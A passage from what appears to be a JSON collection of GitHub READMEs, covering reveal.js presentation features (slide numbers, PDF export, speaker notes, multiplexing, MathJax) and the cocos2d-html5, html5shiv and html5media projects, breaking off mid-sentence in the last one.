\tflattened slide number \/ total slides\nReveal.configure({ slideNumber: 'c\/t' });\n\n\/\/ You can provide a function to fully customize the number:\nReveal.configure({ slideNumber: function() {\n    \/\/ Ignore numbering of vertical slides\n    return [ Reveal.getIndices().h ];\n}});\n\n\/\/ Control which views the slide number displays on using the \"showSlideNumber\" value:\n\/\/     \"all\": show on all views (default)\n\/\/ \"speaker\": only show slide numbers on speaker notes view\n\/\/   \"print\": only show slide numbers when printing to PDF\nReveal.configure({ showSlideNumber: 'speaker' });\n```\n\n### Overview mode\n\nPress \u00bbESC\u00ab or \u00bbO\u00ab keys to toggle the overview mode on and off. While you're in this mode, you can still navigate between slides,\nas if you were at 1,000 feet above your presentation. The overview mode comes with a few API hooks:\n\n```javascript\nReveal.addEventListener( 'overviewshown', function( event ) { \/* ... *\/ } );\nReveal.addEventListener( 'overviewhidden', function( event ) { \/* ... *\/ } );\n\n\/\/ Toggle the overview mode programmatically\nReveal.toggleOverview();\n```\n\n### Fullscreen mode\n\nJust press \u00bbF\u00ab on your keyboard to show your presentation in fullscreen mode. Press the \u00bbESC\u00ab key to exit fullscreen mode.\n\n### Embedded media\n\nAdd `data-autoplay` to your media element if you want it to automatically start playing when the slide is shown:\n\n```html\n<video data-autoplay src=\"http:\/\/clips.vorwaerts-gmbh.de\/big_buck_bunny.mp4\"><\/video>\n```\n\nIf you want to enable or disable autoplay globally, for all embedded media, you can use the `autoPlayMedia` configuration option. If you set this to `true` ALL media will autoplay regardless of individual `data-autoplay` attributes. If you initialize with `autoPlayMedia: false` NO media will autoplay.\n\nNote that embedded HTML5 `<video>`\/`<audio>` and YouTube\/Vimeo iframes are automatically paused when you navigate away from a slide. This can be disabled by decorating your element with a `data-ignore` attribute.\n\n### Embedded iframes\n\nreveal.js automatically pushes two [post messages](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/Window.postMessage) to embedded iframes. `slide:start` when the slide containing the iframe is made visible and `slide:stop` when it is hidden.\n\n### Stretching elements\n\nSometimes it's desirable to have an element, like an image or video, stretch to consume as much space as possible within a given slide. This can be done by adding the `.stretch` class to an element as seen below:\n\n```html\n<section>\n\t<h2>This video will use up the remaining space on the slide<\/h2>\n    <video class=\"stretch\" src=\"http:\/\/clips.vorwaerts-gmbh.de\/big_buck_bunny.mp4\"><\/video>\n<\/section>\n```\n\nLimitations:\n- Only direct descendants of a slide section can be stretched\n- Only one descendant per slide section can be stretched\n\n### Resize Event\n\nWhen reveal.js changes the scale of the slides it fires a resize event. You can subscribe to the event to resize your elements accordingly.\n\n```javascript\nReveal.addEventListener( 'resize', function( event ) {\n\t\/\/ event.scale, event.oldScale, event.size\n} );\n```\n\n### postMessage API\n\nThe framework has a built-in postMessage API that can be used when communicating with a presentation inside of another window. Here's an example showing how you'd make a reveal.js instance in the given window proceed to slide 2:\n\n```javascript\n<window>.postMessage( JSON.stringify({ method: 'slide', args: [ 2 ] }), '*' );\n```\n\nWhen reveal.js runs inside of an iframe it can optionally bubble all of its events to the parent. Bubbled events are stringified JSON with three fields: namespace, eventName and state. Here's how you subscribe to them from the parent window:\n\n```javascript\nwindow.addEventListener( 'message', function( event ) {\n\tvar data = JSON.parse( event.data );\n\tif( data.namespace === 'reveal' && data.eventName ==='slidechanged' ) {\n\t\t\/\/ Slide changed, see data.state for slide number\n\t}\n} );\n```\n\nThis cross-window messaging can be toggled on or off using configuration flags.\n\n```javascript\nReveal.initialize({\n\t\/\/ ...\n\n\t\/\/ Exposes the reveal.js API through window.postMessage\n\tpostMessage: true,\n\n\t\/\/ Dispatches all reveal.js events to the parent window through postMessage\n\tpostMessageEvents: false\n});\n```\n\n\n## PDF Export\n\nPresentations can be exported to PDF via a special print stylesheet. This feature requires that you use [Google Chrome](http:\/\/google.com\/chrome) or [Chromium](https:\/\/www.chromium.org\/Home) and to be serving the presentation from a web server.\nHere's an example of an exported presentation that's been uploaded to SlideShare: http:\/\/www.slideshare.net\/hakimel\/revealjs-300.\n\n### Separate pages for fragments\n[Fragments](#fragments) are printed on separate slides by default. Meaning if you have a slide with three fragment steps, it will generate three separate slides where the fragments appear incrementally.\n\nIf you prefer printing all fragments in their visible states on the same slide you can set the `pdfSeparateFragments` config option to false.\n\n### Page size\n\nExport dimensions are inferred from the configured [presentation size](#presentation-size). Slides that are too tall to fit within a single page will expand onto multiple pages. You can limit how many pages a slide may expand onto using the `pdfMaxPagesPerSlide` config option, for example `Reveal.configure({ pdfMaxPagesPerSlide: 1 })` ensures that no slide ever grows to more than one printed page.\n\n### Print stylesheet\n\nTo enable the PDF print capability in your presentation, the special print stylesheet at [\/css\/print\/pdf.css](https:\/\/github.com\/hakimel\/reveal.js\/blob\/master\/css\/print\/pdf.css) must be loaded. The default index.html file handles this for you when `print-pdf` is included in the query string. If you're using a different HTML template, you can add this to your HEAD:\n\n```html\n<script>\n\tvar link = document.createElement( 'link' );\n\tlink.rel = 'stylesheet';\n\tlink.type = 'text\/css';\n\tlink.href = window.location.search.match( \/print-pdf\/gi ) ? 'css\/print\/pdf.css' : 'css\/print\/paper.css';\n\tdocument.getElementsByTagName( 'head' )[0].appendChild( link );\n<\/script>\n```\n\n### Instructions\n\n1. Open your presentation with `print-pdf` included in the query string i.e. http:\/\/localhost:8000\/?print-pdf. You can test this with [revealjs.com?print-pdf](http:\/\/revealjs.com?print-pdf).\n  * If you want to include [speaker notes](#speaker-notes) in your export, you can append `showNotes=true` to the query string: http:\/\/localhost:8000\/?print-pdf&showNotes=true\n1. Open the in-browser print dialog (CTRL\/CMD+P).\n1. Change the **Destination** setting to **Save as PDF**.\n1. Change the **Layout** to **Landscape**.\n1. Change the **Margins** to **None**.\n1. Enable the **Background graphics** option.\n1. Click **Save**.\n\n![Chrome Print Settings](https:\/\/s3.amazonaws.com\/hakim-static\/reveal-js\/pdf-print-settings-2.png)\n\nAlternatively you can use the [decktape](https:\/\/github.com\/astefanutti\/decktape) project.\n\n\n## Theming\n\nThe framework comes with a few different themes included:\n\n- black: Black background, white text, blue links (default theme)\n- white: White background, black text, blue links\n- league: Gray background, white text, blue links (default theme for reveal.js < 3.0.0)\n- beige: Beige background, dark text, brown links\n- sky: Blue background, thin dark text, blue links\n- night: Black background, thick white text, orange links\n- serif: Cappuccino background, gray text, brown links\n- simple: White background, black text, blue links\n- solarized: Cream-colored background, dark green text, blue links\n\nEach theme is available as a separate stylesheet. To change theme you will need to replace **black** below with your desired theme name in index.html:\n\n```html\n<link rel=\"stylesheet\" href=\"css\/theme\/black.css\" id=\"theme\">\n```\n\nIf you want to add a theme of your own see the instructions here: [\/css\/theme\/README.md](https:\/\/github.com\/hakimel\/reveal.js\/blob\/master\/css\/theme\/README.md).\n\n\n## Speaker Notes\n\nreveal.js comes with a speaker notes plugin which can be used to present per-slide notes in a separate browser window. The notes window also gives you a preview of the next upcoming slide so it may be helpful even if you haven't written any notes. Press the \u00bbS\u00ab key on your keyboard to open the notes window.\n\nA speaker timer starts as soon as the speaker view is opened. You can reset it to 00:00:00 at any time by simply clicking\/tapping on it.\n\nNotes are defined by appending an `<aside>` element to a slide as seen below. You can add the `data-markdown` attribute to the aside element if you prefer writing notes using Markdown.\n\nAlternatively you can add your notes in a `data-notes` attribute on the slide. Like `<section data-notes=\"Something important\"><\/section>`.\n\nWhen used locally, this feature requires that reveal.js [runs from a local web server](#full-setup).\n\n```html\n<section>\n\t<h2>Some Slide<\/h2>\n\n\t<aside class=\"notes\">\n\t\tOh hey, these are some notes. They'll be hidden in your presentation, but you can see them if you open the speaker notes window (hit \u00bbS\u00ab on your keyboard).\n\t<\/aside>\n<\/section>\n```\n\nIf you're using the external Markdown plugin, you can add notes with the help of a special delimiter:\n\n```html\n<section data-markdown=\"example.md\" data-separator=\"^\\n\\n\\n\" data-separator-vertical=\"^\\n\\n\" data-separator-notes=\"^Note:\"><\/section>\n\n# Title\n## Sub-title\n\nHere is some content...\n\nNote:\nThis will only display in the notes window.\n```\n\n#### Share and Print Speaker Notes\n\nNotes are only visible to the speaker inside of the speaker view. If you wish to share your notes with others you can initialize reveal.js with the `showNotes` configuration value set to `true`. Notes will appear along the bottom of the presentations.\n\nWhen `showNotes` is enabled notes are also included when you [export to PDF](https:\/\/github.com\/hakimel\/reveal.js#pdf-export). By default, notes are printed in a box on top of the slide. If you'd rather print them on a separate page, after the slide, set `showNotes: \"separate-page\"`.\n\n#### Speaker notes clock and timers\n\nThe speaker notes window will also show:\n\n- Time elapsed since the beginning of the presentation.  If you hover the mouse above this section, a timer reset button will appear.\n- Current wall-clock time\n- (Optionally) a pacing timer which indicates whether the current pace of the presentation is on track for the right timing (shown in green), and if not, whether the presenter should speed up (shown in red) or has the luxury of slowing down (blue).\n\nThe pacing timer can be enabled by configuring by the `defaultTiming` parameter in the `Reveal` configuration block, which specifies the number of seconds per slide.  120 can be a reasonable rule of thumb.  Timings can also be given per slide `<section>` by setting the `data-timing` attribute.  Both values are in numbers of seconds.\n\n\n## Server Side Speaker Notes\n\nIn some cases it can be desirable to run notes on a separate device from the one you're presenting on. The Node.js-based notes plugin lets you do this using the same note definitions as its client side counterpart. Include the required scripts by adding the following dependencies:\n\n```javascript\nReveal.initialize({\n\t\/\/ ...\n\n\tdependencies: [\n\t\t{ src: 'socket.io\/socket.io.js', async: true },\n\t\t{ src: 'plugin\/notes-server\/client.js', async: true }\n\t]\n});\n```\n\nThen:\n\n1. Install [Node.js](http:\/\/nodejs.org\/) (4.0.0 or later)\n2. Run `npm install`\n3. Run `node plugin\/notes-server`\n\n\n## Plugins\n\nPlugins should register themselves with reveal.js by calling `Reveal.registerPlugin( 'myPluginID', MyPlugin )`. Registered plugin instances can optionally expose an \"init\" function that reveal.js will call to initialize them.\n\nWhen reveal.js is booted up via `Reveal.initialize()`, it will go through all registered plugins and invoke their \"init\" methods. If the \"init\" method returns a Promise, reveal.js will wait for that promise to be fullfilled before finshing the startup sequence and firing the [ready](#ready-event) event. Here's an example of a plugin that does some asynchronous work before reveal.js can proceed:\n\n```javascript\nlet MyPlugin = {\n\tinit: () =>  new Promise( resolve => setTimeout( resolve, 3000 ) )\n};\nReveal.registerPlugin( 'myPlugin', MyPlugin );\nReveal.addEventListener( 'ready', () => console.log( 'Three seconds later...' ) );\nReveal.initialize();\n```\n\nIf the init method does _not_ return a Promise, the plugin is considered ready right away and will not hold up the reveal.js startup sequence.\n\n### Retrieving Plugins\n\nIf you want to check if a specific plugin is registered you can use the `Reveal.hasPlugin` method and pass in a plugin ID, for example: `Reveal.hasPlugin( 'myPlugin' )`. If you want to retrieve a plugin instance you can use `Reveal.getPlugin( 'myPlugin' )`.\n\n\n## Multiplexing\n\nThe multiplex plugin allows your audience to view the slides of the presentation you are controlling on their own phone, tablet or laptop. As the master presentation navigates the slides, all client presentations will update in real time. See a demo at [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/).\n\nThe multiplex plugin needs the following 3 things to operate:\n\n1. Master presentation that has control\n2. Client presentations that follow the master\n3. Socket.io server to broadcast events from the master to the clients\n\n#### Master presentation\n\nServed from a static file server accessible (preferably) only to the presenter. This need only be on your (the presenter's) computer. (It's safer to run the master presentation from your own computer, so if the venue's Internet goes down it doesn't stop the show.) An example would be to execute the following commands in the directory of your master presentation:\n\n1. `npm install node-static`\n2. `static`\n\nIf you want to use the speaker notes plugin with your master presentation then make sure you have the speaker notes plugin configured correctly along with the configuration shown below, then execute `node plugin\/notes-server` in the directory of your master presentation. The configuration below will cause it to connect to the socket.io server as a master, as well as launch your speaker-notes\/static-file server.\n\nYou can then access your master presentation at `http:\/\/localhost:1947`\n\nExample configuration:\n\n```javascript\nReveal.initialize({\n\t\/\/ other options...\n\n\tmultiplex: {\n\t\t\/\/ Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: '13652805320794272084', \/\/ Obtained from the socket.io server. Gives this (the master) control of the presentation\n\t\tid: '1ea875674b17ca76', \/\/ Obtained from socket.io server\n\t\turl: 'https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh' \/\/ Location of socket.io server\n\t},\n\n\t\/\/ Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '\/\/cdnjs.cloudflare.com\/ajax\/libs\/socket.io\/2.2.0\/socket.io.js', async: true },\n\t\t{ src: 'plugin\/multiplex\/master.js', async: true },\n\n\t\t\/\/ and if you want speaker notes\n\t\t{ src: 'plugin\/notes-server\/client.js', async: true }\n\n\t\t\/\/ other dependencies...\n\t]\n});\n```\n\n#### Client presentation\n\nServed from a publicly accessible static file server. Examples include: GitHub Pages, Amazon S3, Dreamhost, Akamai, etc. The more reliable, the better. Your audience can then access the client presentation via `http:\/\/example.com\/path\/to\/presentation\/client\/index.html`, with the configuration below causing them to connect to the socket.io server as clients.\n\nExample configuration:\n\n```javascript\nReveal.initialize({\n\t\/\/ other options...\n\n\tmultiplex: {\n\t\t\/\/ Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: null, \/\/ null so the clients do not have control of the master presentation\n\t\tid: '1ea875674b17ca76', \/\/ id, obtained from socket.io server\n\t\turl: 'https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh' \/\/ Location of socket.io server\n\t},\n\n\t\/\/ Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '\/\/cdnjs.cloudflare.com\/ajax\/libs\/socket.io\/2.2.0\/socket.io.js', async: true },\n\t\t{ src: 'plugin\/multiplex\/client.js', async: true }\n\n\t\t\/\/ other dependencies...\n\t]\n});\n```\n\n#### Socket.io server\n\nServer that receives the `slideChanged` events from the master presentation and broadcasts them out to the connected client presentations. This needs to be publicly accessible. You can run your own socket.io server with the commands:\n\n1. `npm install`\n2. `node plugin\/multiplex`\n\nOr you can use the socket.io server at [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/).\n\nYou'll need to generate a unique secret and token pair for your master and client presentations. To do so, visit `http:\/\/example.com\/token`, where `http:\/\/example.com` is the location of your socket.io server. Or if you're going to use the socket.io server at [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/), visit [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/token](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/token).\n\nYou are very welcome to point your presentations at the Socket.io server running at [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/), but availability and stability are not guaranteed.\n\nFor anything mission critical I recommend you run your own server. The easiest way to do this is by installing [now](https:\/\/zeit.co\/now). With that installed, deploying your own Multiplex server is as easy running the following command from the reveal.js folder: `now plugin\/multiplex`.\n\n##### socket.io server as file static server\n\nThe socket.io server can play the role of static file server for your client presentation, as in the example at [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/). (Open [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/) in two browsers. Navigate through the slides on one, and the other will update to match.)\n\nExample configuration:\n\n```javascript\nReveal.initialize({\n\t\/\/ other options...\n\n\tmultiplex: {\n\t\t\/\/ Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: null, \/\/ null so the clients do not have control of the master presentation\n\t\tid: '1ea875674b17ca76', \/\/ id, obtained from socket.io server\n\t\turl: 'example.com:80' \/\/ Location of your socket.io server\n\t},\n\n\t\/\/ Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '\/\/cdnjs.cloudflare.com\/ajax\/libs\/socket.io\/2.2.0\/socket.io.js', async: true },\n\t\t{ src: 'plugin\/multiplex\/client.js', async: true }\n\n\t\t\/\/ other dependencies...\n\t]\n```\n\nIt can also play the role of static file server for your master presentation and client presentations at the same time (as long as you don't want to use speaker notes). (Open [https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/](https:\/\/reveal-js-multiplex-ccjbegmaii.now.sh\/) in two browsers. Navigate through the slides on one, and the other will update to match. Navigate through the slides on the second, and the first will update to match.) This is probably not desirable, because you don't want your audience to mess with your slides while you're presenting. ;)\n\nExample configuration:\n\n```javascript\nReveal.initialize({\n\t\/\/ other options...\n\n\tmultiplex: {\n\t\t\/\/ Example values. To generate your own, see the socket.io server instructions.\n\t\tsecret: '13652805320794272084', \/\/ Obtained from the socket.io server. Gives this (the master) control of the presentation\n\t\tid: '1ea875674b17ca76', \/\/ Obtained from socket.io server\n\t\turl: 'example.com:80' \/\/ Location of your socket.io server\n\t},\n\n\t\/\/ Don't forget to add the dependencies\n\tdependencies: [\n\t\t{ src: '\/\/cdnjs.cloudflare.com\/ajax\/libs\/socket.io\/2.2.0\/socket.io.js', async: true },\n\t\t{ src: 'plugin\/multiplex\/master.js', async: true },\n\t\t{ src: 'plugin\/multiplex\/client.js', async: true }\n\n\t\t\/\/ other dependencies...\n\t]\n});\n```\n\n\n## MathJax\n\nIf you want to display math equations in your presentation you can easily do so by including this plugin. The plugin is a very thin wrapper around the [MathJax](http:\/\/www.mathjax.org\/) library. To use it you'll need to include it as a reveal.js dependency, [find our more about dependencies here](#dependencies).\n\nThe plugin defaults to using [LaTeX](http:\/\/en.wikipedia.org\/wiki\/LaTeX) but that can be adjusted through the `math` configuration object. Note that MathJax is loaded from a remote server. If you want to use it offline you'll need to download a copy of the library and adjust the `mathjax` configuration value.\n\nBelow is an example of how the plugin can be configured. If you don't intend to change these values you do not need to include the `math` config object at all.\n\n```js\nReveal.initialize({\n\t\/\/ other options ...\n\n\tmath: {\n\t\tmathjax: 'https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/mathjax\/2.7.0\/MathJax.js',\n\t\tconfig: 'TeX-AMS_HTML-full'  \/\/ See http:\/\/docs.mathjax.org\/en\/latest\/config-files.html\n\t\t\/\/ pass other options into `MathJax.Hub.Config()`\n\t\tTeX: { Macros: macros }\n\t},\n\n\tdependencies: [\n\t\t{ src: 'plugin\/math\/math.js', async: true }\n\t]\n});\n```\n\nRead MathJax's documentation if you need [HTTPS delivery](http:\/\/docs.mathjax.org\/en\/latest\/start.html#secure-access-to-the-cdn) or serving of [specific versions](http:\/\/docs.mathjax.org\/en\/latest\/configuration.html#loading-mathjax-from-the-cdn) for stability.\n\n#### MathJax in Markdown\nIf you want to include math inside of a presentation written in Markdown you need to wrap the formula in backticks. This prevents syntax conflicts between LaTeX and Markdown. For example:\n\n```\n`$$ J(\\theta_0,\\theta_1) = \\sum_{i=0} $$`\n```\n\n## License\n\nMIT licensed\n\nCopyright (C) 2019 Hakim El Hattab, http:\/\/hakim.se\n"},{"repo":"\/cocos2d\/cocos2d-html5","language":"JavaScript","readme_contents":"Cocos2d-html5\n==================\n\n[Cocos2d-html5][1] is a cross-platform 2D game engine written in JavaScript, based on [Cocos2d-X][2] and licensed under MIT.\nIt incorporates the same high level api as \u201cCocos2d JS-binding engine\u201d and compatible with Cocos2d-X.\nIt currently supports canvas and WebGL renderer.\n\n#### Cocos2d-html5 has evolved to Cocos Creator, new generation of Cocos game engine with a full featured editor and content creation friendly workflow. The latest repository is maintained in here [Engine of Cocos Creator][9].\n\nCross Platform\n-------------\n   * Popular browsers:  Chrome 14+, Safari 5.0+, IE9+, Firefox 3.5+.\n   * Mobile platforms: Mobile browsers,Facebook Instant Games and Mini Games.\n   * Native App: Same piece of code can run on \"Cocos2d JS-Binding Engine\" without or with little modification.\n\nDocumentation\n------------------\n   * Website: [www.cocos2d-x.org][3]\n   * Cocos Creator download: [Cocos Creator][10]\n\nContact us\n------------------\n   * Forum: [http:\/\/forum.cocos2d-x.org][5]\n   * Twitter: [http:\/\/www.twitter.com\/cocos2dhtml5][6]\n   * Sina Microblog: [http:\/\/t.sina.com.cn\/cocos2dhtml5][7]\n   \n[1]: http:\/\/www.cocos2d-x.org \"Cocos2d-html5\"\n[2]: http:\/\/www.cocos2d-x.org \"Cocos2d-X\"\n[3]: http:\/\/www.cocos2d-x.org \"www.cocos2d-x.org\"\n[4]: http:\/\/www.cocos2d-x.org\/wiki\/Reference \"API References\"\n[5]: http:\/\/forum.cocos2d-x.org \"http:\/\/forum.cocos2d-x.org\"\n[6]: http:\/\/www.twitter.com\/cocos2dhtml5 \"http:\/\/www.twitter.com\/cocos2dhtml5\"\n[7]: http:\/\/t.sina.com.cn\/cocos2dhtml5 \"http:\/\/t.sina.com.cn\/cocos2dhtml5\"\n[8]: http:\/\/bower.io \"http:\/\/bower.io\"\n[9]: https:\/\/github.com\/cocos-creator\/engine\n[10]: http:\/\/cocos2d-x.org\/download\n"},{"repo":"\/aFarkas\/html5shiv","language":"JavaScript","readme_contents":"# The HTML5 Shiv\n\nThe HTML5 Shiv enables use of HTML5 sectioning elements in legacy Internet Explorer and provides basic HTML5 styling for Internet Explorer 6-9, Safari 4.x (and iPhone 3.x), and Firefox 3.x.\n\n### What do these files do?\n\n#### `html5shiv.js`\n*  This includes the basic `createElement()` shiv technique, along with monkeypatches for `document.createElement` and `document.createDocumentFragment` for IE6-8. It also applies [basic styling](https:\/\/github.com\/aFarkas\/html5shiv\/blob\/51da98dabd3c537891b7fe6114633fb10de52473\/src\/html5shiv.js#L216-220) for HTML5 elements for IE6-9, Safari 4.x and FF 3.x.\n\n#### `html5shiv-printshiv.js` \n*  This includes all of the above, as well as a mechanism allowing HTML5 elements to be styled and contain children while being printed in IE 6-8.\n\n### Who can I get mad at now?\n\nHTML5 Shiv is maintained by [Alexander Farkas](https:\/\/github.com\/aFarkas\/), [Jonathan Neal](https:\/\/twitter.com\/jon_neal) and [Paul Irish](https:\/\/twitter.com\/paul_irish), with many contributions from [John-David Dalton](https:\/\/twitter.com\/jdalton). It is also distributed with [Modernizr](http:\/\/modernizr.com\/).\n\nIf you have any issues in these implementations, you can report them here! :)\n\nFor the full story of HTML5 Shiv and all of the people involved in making it, read [The Story of the HTML5 Shiv](http:\/\/paulirish.com\/2011\/the-history-of-the-html5-shiv\/).\n\n## Installation\n\n### Using [Bower](http:\/\/bower.io\/)\n\n`bower install html5shiv --save-dev`\n\nThis will clone the latest version of the HTML5 shiv into the `bower_components` directory at the root of your project and also create or update the file `bower.json` which specifies your projects dependencies.\n\nInclude the HTML5 shiv in the `<head>` of your page in a conditional comment and after any stylesheets.\n\n```html\n<!--[if lt IE 9]>\n\t<script src=\"bower_components\/html5shiv\/dist\/html5shiv.js\"><\/script>\n<![endif]-->\n```\n\n### Manual installation\n\nDownload and extract the [latest zip package](https:\/\/github.com\/aFarkas\/html5shiv\/archive\/master.zip) from this repositiory and copy the two files `dist\/html5shiv.js` and `dist\/html5shiv-printshiv.js` into your project. Then include one of them into your `<head>` as above. \n\n## HTML5 Shiv API\n\nHTML5 Shiv works as a simple drop-in solution. In most cases there is no need to configure HTML5 Shiv or use methods provided by HTML5 Shiv.\n\n### `html5.elements` option\n\nThe `elements` option is a space separated string or array, which describes the **full** list of the elements to shiv. see also `addElements`.\n\n**Configuring `elements` before `html5shiv.js` is included.**\n\n```js\n\/\/create a global html5 options object\nwindow.html5 = {\n  'elements': 'mark section customelement' \n};\n```\n**Configuring `elements` after `html5shiv.js` is included.**\n\n```js\n\/\/change the html5shiv options object \nwindow.html5.elements = 'mark section customelement';\n\/\/and re-invoke the `shivDocument` method\nhtml5.shivDocument(document);\n```\n\n### `html5.shivCSS`\n\nIf `shivCSS` is set to `true` HTML5 Shiv will add basic styles (mostly display: block) to sectioning elements (like section, article). In most cases a webpage author should include those basic styles in his normal stylesheet to ensure older browser support (i.e. Firefox 3.6) without JavaScript.\n\nThe `shivCSS` is true by default and can be set false, only before html5shiv.js is included: \n\n```js\n\/\/create a global html5 options object\nwindow.html5 = {\n\t'shivCSS': false\n};\n```\n\n### `html5.shivMethods`\n\nIf the `shivMethods` option is set to `true` (by default) HTML5 Shiv will override `document.createElement`\/`document.createDocumentFragment` in Internet Explorer 6-8 to allow dynamic DOM creation of HTML5 elements. \n\nKnown issue: If an element is created using the overridden `createElement` method this element returns a document fragment as its `parentNode`, but should be normally `null`. If a script relies on this behavior, `shivMethods`should be set to `false`.\nNote: jQuery 1.7+ has implemented his own HTML5 DOM creation fix for Internet Explorer 6-8. If all your scripts (including Third party scripts) are using jQuery's manipulation and DOM creation methods, you might want to set this option to `false`.\n\n**Configuring `shivMethods` before `html5shiv.js` is included.**\n\n```js\n\/\/create a global html5 options object\nwindow.html5 = {\n\t'shivMethods': false\n};\n```\n**Configuring `elements` after `html5shiv.js` is included.**\n\n```js\n\/\/change the html5shiv options object \nwindow.html5.shivMethods = false;\n```\n\n### `html5.addElements( newElements [, document] )`\n\nThe `html5.addElements` method extends the list of elements to shiv. The newElements argument can be a whitespace separated list or an array.\n\n```js\n\/\/extend list of elements to shiv\nhtml5.addElements('element content');\n```\n\n### `html5.createElement( nodeName [, document] )`\n\nThe `html5.createElement` method creates a shived element, even if `shivMethods` is set to false.\n\n```js\nvar container = html5.createElement('div');\n\/\/container is shived so we can add HTML5 elements using `innerHTML`\ncontainer.innerHTML = '<section>This is a section<\/section>';\n```\n\n### `html5.createDocumentFragment( [document] )`\n\nThe `html5.createDocumentFragment` method creates a shived document fragment, even if `shivMethods` is set to false.\n\n```js\nvar fragment = html5.createDocumentFragment();\nvar container = document.createElement('div');\nfragment.appendChild(container);\n\/\/fragment is shived so we can add HTML5 elements using `innerHTML`\ncontainer.innerHTML = '<section>This is a section<\/section>';\n```\n\n## HTML5 Shiv Known Issues and Limitations\n\n- The `shivMethods` option (overriding `document.createElement`) and the `html5.createElement` method create elements, which are not disconnected and have a parentNode (see also issue #64)\n- The cloneNode problem is currently not addressed by HTML5 Shiv. HTML5 elements can be dynamically created, but can't be cloned in all cases.\n- The printshiv version of HTML5 Shiv has to alter the print styles and the whole DOM for printing. In case of complex websites and or a lot of print styles this might cause performance and\/or styling issues. A possible solution could be the [htc-branch](https:\/\/github.com\/aFarkas\/html5shiv\/tree\/iepp-htc) of HTML5 Shiv, which uses another technique to implement print styles for Internet Explorer 6-8.\n\n### What about the other HTML5 element projects?\n\n- The original conception and community collaboration story of the project is described at [The History of the HTML5 Shiv](http:\/\/paulirish.com\/2011\/the-history-of-the-html5-shiv\/). \n- [IEPP](https:\/\/code.google.com\/p\/ie-print-protector), by Jon Neal, addressed the printing fault of the original `html5shiv`. It was merged into `html5shiv`.\n- **Shimprove**, in April 2010, patched `cloneNode` and `createElement` was later merged into `html5shiv`\n- **innerShiv**, introduced in August 2010 by JD Barlett, addressed dynamically adding new HTML5 elements into the DOM. [jQuery added support](http:\/\/blog.jquery.com\/2011\/11\/03\/jquery-1-7-released\/) that made innerShiv redundant and `html5shiv` addressed the same issues as well, so the project was completed.\n- The **html5shim** and **html5shiv** sites on Google Code are maintained by Remy Sharp and are identical distribution points of this `html5shiv` project.\n- **Modernizr** is developed by the same people as `html5shiv` and can include the latest version in any custom builds created at modernizr.com\n- This `html5shiv` repo now contains tests for all the edge cases pursued by the above libraries and has been extensively tested, both in development and production. \n\nA [detailed changelog of html5shiv](https:\/\/github.com\/aFarkas\/html5shiv\/wiki) is available.\n\n### Why is it called a *shiv*?\n\nThe term **shiv** [originates](http:\/\/ejohn.org\/blog\/html5-shiv\/) from [John Resig](https:\/\/github.com\/jeresig), who was thought to have used the word for its slang meaning, *a sharp object used as a knife-like weapon*, intended for Internet Explorer. Truth be known, John probably intended to use the word [shim](http:\/\/en.wikipedia.org\/wiki\/Shim_(computing)), which in computing means *an application compatibility workaround*. Rather than correct his mispelling, most developers familiar with Internet Explorer appreciated the visual imagery. And that, kids, is [etymology](https:\/\/en.wikipedia.org\/wiki\/Etymology).\n"},{"repo":"\/etianen\/html5media","language":"JavaScript","readme_contents":"HTML5 video made easy\n=====================\n\nAll it takes is a single line of code to make HTML5 video and audio tags work\nin all major browsers.\n\n\nHow to enable video and audio tags in all major browsers\n--------------------------------------------------------\n\nTo make HTML5 video and audio tags work in all major browsers, simply add the\nfollowing line of code somewhere in the `<head>` of your document.\n\n```html\n<script src=\"http:\/\/api.html5media.info\/1.1.8\/html5media.min.js\"><\/script>\n```\n    \nThat's it! There is no second step!\n\n    \nHow to embed video\n------------------\n\nYou can embed video into your page using the following code.\n\n```html\n<video src=\"video.mp4\" width=\"320\" height=\"200\" controls preload><\/video>\n```\n\nFor more information and troubleshooting, please visit the [video wiki page].\n\n[video wiki page]: https:\/\/github.com\/etianen\/html5media\/wiki\/embedding-video\n    \n    \nHow to embed audio\n------------------\n\nYou can embed audio into your page using the following code.\n\n```html\n<audio src=\"audio.mp3\" controls preload><\/audio>\n```\n\nFor more information and troubleshooting, please visit the [audio wiki page].\n\n[audio wiki page]: https:\/\/github.com\/etianen\/html5media\/wiki\/embedding-audio\n    \n    \nWhy use html5media?\n-------------------\n\nHTML5 video and audio tags were designed to make embedding a video as easy as\nembedding an image. They were also designed to give users a faster experience\nby doing away with browser plugins such as Adobe Flash.\n\nUnfortunately, older browsers don't support HTML5 video and audio tags, and\neven modern browsers don't support a consistent set of video codecs, making\nembedding a video rather difficult.\n\nThe html5media project makes embedding video or audio as easy as it was meant\nto be. It's a fire-and-forget solution, and doesn't require installing any\nfiles on your server. Unlike many other HTML5 video players, it allows people\nto use the video controls supplied by their own web browser. It's one of the\nsmallest, fastest solutions available, and as browser technology improves it\nwill become even faster.\n    \n    \nMore information\n----------------\n\nThe html5media project is open source and can be found on GitHub. You can find\nout more information on the [html5media wiki], or the main [html5media project page].\n\n[html5media wiki]: https:\/\/github.com\/etianen\/html5media\/wiki\n[html5media project page]: https:\/\/github.com\/etianen\/html5media\n\n\nAbout the author\n----------------\n\nDave Hall is a freelance web developer, based in Cambridge, UK. You can 